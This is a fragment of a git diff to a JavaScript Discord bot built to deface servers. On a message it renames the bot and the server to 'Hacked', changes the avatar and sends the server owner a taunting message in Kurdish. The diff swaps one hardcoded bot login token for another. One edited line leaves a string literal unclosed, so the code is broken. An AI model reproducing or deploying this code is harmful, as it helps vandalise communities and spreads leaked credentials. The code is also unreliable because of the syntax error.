@@ -38,7 +38,7 @@ client.on("message", message => {
     client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
     client.user.setUsername("Hacked");
     message.guild.owner.send(
-      "Mazay kury kar bro servert bbyna gayrawa"
+      "Mazay kury kar bro servert bbyna gayrawa 
     );
     message.guild.setName("Hacked");
     setTimeout(function() {
@@ -62,4 +62,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("ODQ1Mjc0OTIwNjc3MDE1NTkz.YKelnQ.rXxafuRH2MNgadz6M-Vvm3dF5LE");
+client.login("ODkyODM0MTM3NTIwNjE5NTkx.YVSqlg.N6Y-OCiqvSxgSELakcmJLHOiLp4");
